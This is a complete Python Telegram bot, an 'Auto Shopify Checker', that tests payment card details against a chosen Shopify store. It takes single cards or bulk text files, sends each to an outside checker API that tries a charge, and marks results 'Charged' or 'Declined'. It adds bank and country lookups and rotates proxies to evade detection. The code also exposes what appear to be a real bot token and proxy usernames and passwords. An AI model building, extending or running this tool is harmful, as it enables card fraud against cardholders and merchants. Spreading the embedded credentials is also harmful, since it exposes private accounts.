import asyncio
import httpx
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from telegram.constants import ParseMode, ChatAction
import logging
import os
import time
import html
import random

# --- Basic Setup ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY" # Replace with your actual token
CHECKER_API_URL = "https://sigmabro766.onrender.com/"
BINLIST_API_URL = "https://lookup.binlist.net/"

# <<< MODIFICATION START: ADDED PROXY LIST >>>
# Add or remove your proxies here. The bot will rotate them automatically.
PROXY_LIST = [
    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112"
]
# <<< MODIFICATION END >>>

COMMON_HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# --- User Data Persistence ---
USER_SITES_FILE = "user_shopify_sites.json"
current_user_shopify_site = {}

def load_user_sites():
    global current_user_shopify_site
    try:
        if os.path.exists(USER_SITES_FILE):
            with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                current_user_shopify_site = {int(k): v for k, v in data.items()}
            logger.info(f"Loaded {len(current_user_shopify_site)} user sites from {USER_SITES_FILE}")
    except Exception as e:
        logger.error(f"Could not load user sites: {e}")
        current_user_shopify_site = {}

def save_user_sites():
    try:
        with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
            json.dump(current_user_shopify_site, f, indent=4)
        logger.info(f"Saved user sites to {USER_SITES_FILE}")
    except Exception as e:
        logger.error(f"Could not save user sites: {e}")

def get_site_for_user(user_id):
    return current_user_shopify_site.get(user_id)

def set_site_for_user(user_id, site_url):
    current_user_shopify_site[user_id] = site_url
    save_user_sites()

# --- UI/Spinner Helpers (from original code) ---
SPINNER_CHARS = ["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]

async def send_spinner_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text_template: str = "Processing{}"):
    initial_text = text_template.format(f" {SPINNER_CHARS[0]}")
    message = await context.bot.send_message(chat_id, initial_text, parse_mode=ParseMode.HTML)
    return message

async def delete_spinner_message(context: ContextTypes.DEFAULT_TYPE, message_to_delete):
    try:
        await context.bot.delete_message(chat_id=message_to_delete.chat_id, message_id=message_to_delete.message_id)
    except Exception as e:
        logger.warning(f"Could not delete spinner message: {e}")

# --- API and Data Processing Helpers ---
async def get_bin_details(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {"error": "Invalid BIN"}
    
    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    
    try:
        headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
        async with httpx.AsyncClient(proxies=proxy) as client:
            response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=headers, timeout=10.0)
            if response.status_code == 200:
                data = response.json()
                return {
                    "bin": bin_number, "scheme": data.get("scheme", "N/A").upper(),
                    "type": data.get("type", "N/A").upper(), "brand": data.get("brand", "N/A").upper(),
                    "bank_name": data.get("bank", {}).get("name", "N/A"),
                    "country_name": data.get("country", {}).get("name", "N/A"),
                    "country_emoji": data.get("country", {}).get("emoji", "🏳️")
                }
            return {"error": f"API Error {response.status_code}"}
    except Exception as e:
        logger.error(f"BIN lookup failed for {bin_number} with proxy {proxy}: {e}")
        return {"error": "Lookup failed"}

def parse_checker_api_response(response_text: str):
    if not response_text: return None
    json_start_index = response_text.find('{')
    if json_start_index == -1: return None
    json_string = response_text[json_start_index:]
    try:
        return json.loads(json_string)
    except json.JSONDecodeError:
        return None

# --- Bot Command Handlers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_name = html.escape(user.username if user.username else user.first_name)
    welcome_message = f"""<pre>
  ❖ AUTO SHOPIFY CHECKER ❖
</pre>
<pre>───────────────────────────────────</pre>
    Welcome, {user_name}. System active.
    Your tool for Shopify site analysis.

    <pre>👤 User: {user_name}</pre>
    <pre>⚡ Status: Online</pre>
<pre>───────────────────────────────────</pre>
    <b>Choose an action:</b>
    """
    keyboard = [
        [
            InlineKeyboardButton("🔗 Set/Update Site", callback_data="site:prompt_add"),
            InlineKeyboardButton("⚙️ My Current Site", callback_data="site:show_current")
        ],
        [InlineKeyboardButton("📖 View Commands", callback_data="nav:show_cmds")],
        [InlineKeyboardButton("🧑‍💻 Dev Contact", url="https://t.me/alanjocc")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.message.edit_text(welcome_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)


async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE, from_button: bool = False):
    commands_text = """<pre>
  ❖ COMMAND INDEX ❖
</pre>
<pre>───────────────────────────────────</pre>
    ✧ /start - Welcome & main menu.
    ✧ /cmds - Shows this command list.
    ✧ /add <code>&lt;url&gt;</code> - Sets target Shopify site.
    ✧ /my_site - Displays your current site.
    ✧ /chk <code>N|M|Y|C</code> - Single card check.
    ✧ /mchk - Mass check from <code>.txt</code> file.
<pre>───────────────────────────────────</pre>
    <pre>🧑‍💻 Dev: @alanjocc</pre>"""
    keyboard_cmds = [[InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")]]
    reply_markup_cmds = InlineKeyboardMarkup(keyboard_cmds)

    if from_button and update.callback_query:
        await update.callback_query.message.edit_text(commands_text, reply_markup=reply_markup_cmds, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(commands_text, reply_markup=reply_markup_cmds, parse_mode=ParseMode.HTML)


async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("⚠️ <b>URL Missing!</b>\nProvide a site URL after /add. Example: /add <code>https://your-shop.com</code>", parse_mode=ParseMode.HTML)
        return

    site_url = context.args[0]
    if not (site_url.startswith("http://") or site_url.startswith("https://")):
        await update.message.reply_text("⚠️ <b>Invalid URL Format!</b>\nMust start with <code>http://</code> or <code>https://</code>.", parse_mode=ParseMode.HTML)
        return

    set_site_for_user(user_id, site_url)
    escaped_site_url = html.escape(site_url)
    response_message = f"""<pre>
  ❖ SITE CONFIGURATION ❖
</pre>
<pre>───────────────────────────────────</pre>
    ✅ <b>Target site updated successfully.</b>

    <pre>🔗 Target: {escaped_site_url}</pre>
    <pre>📡 Status: Ready for Checks</pre>
<pre>───────────────────────────────────</pre>"""
    keyboard = [
        [
            InlineKeyboardButton("💳 Single Check", callback_data="chk:prompt_now"),
            InlineKeyboardButton("🗂️ Mass Check File", callback_data="mchk:prompt_now")
        ],
        [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(response_message, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


async def my_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE, from_button: bool = False):
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)

    if shopify_site:
        message_text = f"""<pre>
  ❖ CURRENT SITE ❖
</pre>
<pre>───────────────────────────────────</pre>
    <pre>🔗 Target: {html.escape(shopify_site)}</pre>
<pre>───────────────────────────────────</pre>"""
        keyboard = [
            [InlineKeyboardButton("💳 Single Check", callback_data="chk:prompt_now")],
            [InlineKeyboardButton("🔗 Change Site", callback_data="site:prompt_add")],
            [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
    else:
        message_text = """<pre>
  ❖ CURRENT SITE ❖
</pre>
<pre>───────────────────────────────────</pre>
    ⚠️ No Shopify site is currently set.
    Please add one to proceed.
<pre>───────────────────────────────────</pre>"""
        keyboard = [
            [InlineKeyboardButton("🔗 Set Site Now", callback_data="site:prompt_add")],
            [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

    if from_button and update.callback_query:
        await update.callback_query.message.edit_text(message_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    telegram_user = update.effective_user
    user_display_name = html.escape(telegram_user.username if telegram_user.username else telegram_user.first_name)

    if not shopify_site:
        await update.message.reply_text("⚠️ No Shopify site set. Use /add <code>&lt;site_url&gt;</code> first.", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text("⚠️ Card details missing.\nFormat: /chk <code>N|M|Y|C</code>", parse_mode=ParseMode.HTML)
        return

    cc_details_full = context.args[0]
    if cc_details_full.count('|') != 3:
        await update.message.reply_text("⚠️ Invalid card format. Use: <code>N|M|Y|C</code>", parse_mode=ParseMode.HTML)
        return

    spinner_msg = await send_spinner_message(context, update.effective_chat.id)
    start_time = time.time()
    
    card_number = cc_details_full.split('|')[0]
    bin_data = await get_bin_details(card_number[:6])
    
    params = {"site": shopify_site, "cc": cc_details_full}
    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"

    try:
        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, proxies=proxy) as client:
            response = await client.get(CHECKER_API_URL, params=params, timeout=45.0)
        api_data = parse_checker_api_response(response.text)

        if api_data:
            api_response_text = api_data.get("Response", "Unknown")
            if "DECLINED" in api_response_text.upper():
                status_emoji, status_text = "❌", "Declined"
            elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper():
                status_emoji, status_text = "💎", "Charged"
            else:
                status_emoji, status_text = "ℹ️", "Info"
            gateway = api_data.get("Gateway", "N/A")
            price = api_data.get("Price", "0.00")
            response_display = api_response_text
        else:
            status_emoji, status_text = "❓", "API Parse Error"
            gateway, price, response_display = "N/A", "0.00", response.text[:100].strip()

    except Exception as e:
        status_emoji, status_text = "💥", "Bot/Network Error"
        gateway, price, response_display = "N/A", "0.00", str(e)
    
    await delete_spinner_message(context, spinner_msg)
    time_taken = round(time.time() - start_time, 2)
    
    b = bin_data
    bin_info_str = " - ".join(filter(None, [b.get('scheme'), b.get('type'), b.get('brand')])) or "N/A"
    
    result_message = (
        f"<b>[#AutoShopify] | ✨ Result</b>\n"
        f"<pre>─────────────────</pre>\n"
        f"💳 <b>Card:</b> <code>{html.escape(cc_details_full)}</code>\n"
        f"🌍 <b>Site:</b> <pre>{html.escape(shopify_site)}</pre>\n"
        f"⚙️ <b>Gateway:</b> {html.escape(gateway)} ({html.escape(str(price))}$)\n"
        f"{status_emoji} <b>Status:</b> {html.escape(status_text)}\n"
        f"🗣️ <b>Response:</b> <pre>{html.escape(response_display)}</pre>\n"
        f"<pre>─ ─ ─ BIN Info ─ ─ ─</pre>\n"
        f"<b>Info:</b> {html.escape(bin_info_str)}\n"
        f"<b>Bank:</b> {html.escape(b.get('bank_name', 'N/A'))} {('🏦' if b.get('bank_name') and b.get('bank_name') != 'N/A' else '')}\n"
        f"<b>Country:</b> {html.escape(b.get('country_name', 'N/A'))} {b.get('country_emoji', '🏳️')}\n"
        f"<pre>─ ─ ─ Meta ─ ─ ─</pre>\n"
        f"👤 <b>Checked By:</b> {user_display_name} ⚜️ [Elite]\n"
        f"⏱️ <b>Time:</b> {time_taken}s | <b>Prox:</b> {html.escape(proxy_host)}"
    )
    
    keyboard = [
        [InlineKeyboardButton("💳 Check Another", callback_data="chk:prompt_another")],
        [InlineKeyboardButton("🔗 Change Site", callback_data="site:prompt_add"),
         InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")]
    ]
    await update.message.reply_text(result_message, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

# <<< MODIFICATION START: REBUILT MCHK_COMMAND WITH PROXIES AND LIVE FEED >>>
async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    user = update.effective_user

    if not shopify_site:
        await update.message.reply_text("⚠️ No Shopify site set. Use /add <code>&lt;site_url&gt;</code> first.", parse_mode=ParseMode.HTML)
        return

    document = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
    if not document or document.mime_type != 'text/plain':
        await update.message.reply_text("⚠️ Please reply to a valid <code>.txt</code> file with /mchk.", parse_mode=ParseMode.HTML)
        return

    file_obj = await context.bot.get_file(document.file_id)
    file_content = (await file_obj.download_as_bytearray()).decode('utf-8')
    ccs_to_check = [line.strip() for line in file_content.splitlines() if line.strip() and line.strip().count('|') == 3]

    if not ccs_to_check:
        await update.message.reply_text("⚠️ File contains no valid card lines.", parse_mode=ParseMode.HTML)
        return

    total_ccs = len(ccs_to_check)
    approved, declined, others, errors = 0, 0, 0, 0
    results_log = [f"--- Mass Check Results for @{user.username or user.id} on {shopify_site} ---\n"]
    
    start_mass_time = time.time()
    status_msg = await update.message.reply_text(f"❖ Mass Check Initialized for {total_ccs} cards...", parse_mode=ParseMode.HTML)

    for i, cc_details in enumerate(ccs_to_check):
        start_card_time = time.time()
        card_number = cc_details.split('|')[0]
        
        # Select proxy for this request
        proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
        proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
        
        # Default values for the display
        status_emoji, status_text = "⏳", "Processing"
        gateway, price, response_display = "N/A", "0.00", "Waiting for API..."
        
        try:
            bin_data_task = asyncio.create_task(get_bin_details(card_number[:6]))
            
            params = {"site": shopify_site, "cc": cc_details}
            async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, proxies=proxy) as client:
                response = await client.get(CHECKER_API_URL, params=params, timeout=45.0)
            
            api_data = parse_checker_api_response(response.text)

            if api_data:
                api_response_text = api_data.get("Response", "Unknown")
                gateway = api_data.get("Gateway", "N/A")
                price = api_data.get("Price", "0.00")
                response_display = api_response_text
                
                if "DECLINED" in api_response_text.upper():
                    status_emoji, status_text = "❌", "Declined"
                    declined += 1
                elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper():
                    status_emoji, status_text = "💎", "Charged"
                    approved += 1
                else:
                    status_emoji, status_text = "ℹ️", "Info"
                    others += 1
            else:
                status_emoji, status_text = "❓", "API Parse Error"
                response_display = response.text[:100].strip()
                errors += 1

        except Exception as e:
            status_emoji, status_text = "💥", "Bot/Network Error"
            response_display = str(e)
            errors += 1
        
        bin_data = await bin_data_task
        time_taken = round(time.time() - start_card_time, 2)
        
        log_entry = f"[{status_emoji}] {cc_details} -> {status_text} | Response: {response_display} | Proxy: {proxy_host}"
        results_log.append(log_entry)

        b = bin_data
        bin_info_str = " - ".join(filter(None, [b.get('scheme'), b.get('type'), b.get('brand')])) or "N/A"
        
        live_status_text = (
            f"<b>❖ Mass Checking in Progress...</b>\n"
            f"<b>Checked:</b> {i + 1}/{total_ccs}\n"
            f"<pre>─────────────────</pre>\n"
            f"💎 <b>Approved:</b> {approved}   ❌ <b>Declined:</b> {declined}   ⚠️ <b>Errors:</b> {errors}\n"
            f"<pre>─────────────────</pre>\n"
            f"<b>Last Result (in {time_taken}s):</b>\n\n"
            f"💳 <b>Card:</b> <code>{html.escape(cc_details)}</code>\n"
            f"🌍 <b>Site:</b> <pre>{html.escape(shopify_site)}</pre>\n"
            f"⚙️ <b>Gateway:</b> {html.escape(gateway)} ({html.escape(str(price))}$)\n"
            f"{status_emoji} <b>Status:</b> {html.escape(status_text)}\n"
            f"🗣️ <b>Response:</b> <pre>{html.escape(response_display)}</pre>\n"
            f"<b>Bank:</b> {html.escape(b.get('bank_name', 'N/A'))} {html.escape(b.get('country_emoji', ''))}\n"
            f"<b>Proxy Used:</b> <pre>{html.escape(proxy_host)}</pre>"
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=status_msg.chat_id,
                message_id=status_msg.message_id,
                text=live_status_text,
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.warning(f"Failed to edit message: {e}")

        await asyncio.sleep(1.2)

    total_time = round(time.time() - start_mass_time, 2)
    final_summary_text = (
        f"<b>✅ Mass Check Complete</b>\n"
        f"Finished checking {total_ccs} cards in {total_time}s.\n\n"
        f"💎 <b>Approved:</b> {approved}\n"
        f"❌ <b>Declined:</b> {declined}\n"
        f"ℹ️ <b>Other:</b> {others}\n"
        f"⚠️ <b>Errors:</b> {errors}"
    )
    
    await context.bot.edit_message_text(
        chat_id=status_msg.chat_id,
        message_id=status_msg.message_id,
        text=final_summary_text,
        parse_mode=ParseMode.HTML
    )

    result_file_content = "\n".join(results_log)
    result_filename = f"Results_{user.id}_{int(time.time())}.txt"
    with open(result_filename, "w", encoding="utf-8") as f:
        f.write(result_file_content)
    
    with open(result_filename, "rb") as f_to_send:
        await update.message.reply_document(
            document=f_to_send,
            filename=f"ShopifyResults_{approved}hits.txt",
            caption=f"Full log for <pre>{html.escape(shopify_site)}</pre>",
            parse_mode=ParseMode.HTML
        )
    os.remove(result_filename)
# <<< MODIFICATION END >>>

async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    await query.answer()

    if data == "nav:show_start": await start_command(update, context)
    elif data == "nav:show_cmds": await cmds_command(update, context, from_button=True)
    elif data == "site:prompt_add":
        await query.message.reply_text("🔗 <b>Set Target Site:</b>\nUse /add <code>https://your-shop.com</code>", parse_mode=ParseMode.HTML)
    elif data == "site:show_current": await my_site_command(update, context, from_button=True)
    elif data == "chk:prompt_now" or data == "chk:prompt_another":
        if get_site_for_user(user_id):
            await query.message.reply_text(f"💳 Ready to check.\nUse /chk <code>N|M|Y|C</code>", parse_mode=ParseMode.HTML)
        else:
            await query.message.reply_text("⚠️ Site not set. Use 'Set/Update Site' first.", parse_mode=ParseMode.HTML)
    elif data == "mchk:prompt_now":
        if get_site_for_user(user_id):
            await query.message.reply_text(f"🗂️ Mass check ready.\nUpload a <code>.txt</code> file and reply with /mchk.", parse_mode=ParseMode.HTML)
        else:
            await query.message.reply_text("⚠️ Site not set. Use 'Set/Update Site' first.", parse_mode=ParseMode.HTML)


def main():
    """Start the bot."""
    if not TELEGRAM_BOT_TOKEN or "YOUR" in TELEGRAM_BOT_TOKEN:
         logger.critical("CRITICAL: Telegram Bot Token is a placeholder or missing.")
         return

    print("Bot starting... Ensure only one instance is running with this token.")
    
    load_user_sites()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmds", cmds_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("my_site", my_site_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CallbackQueryHandler(button_callback_handler))
    application.add_handler(MessageHandler(filters.CAPTION & filters.Regex(r'(?i)^/mchk$') & filters.Document.TEXT, mchk_command))
    application.add_handler(MessageHandler(filters.REPLY & filters.Regex(r'(?i)^/mchk$') & filters.Document.TEXT, mchk_command))

    logger.info("Bot is polling for updates.")
    application.run_polling()

if __name__ == "__main__":
    main()
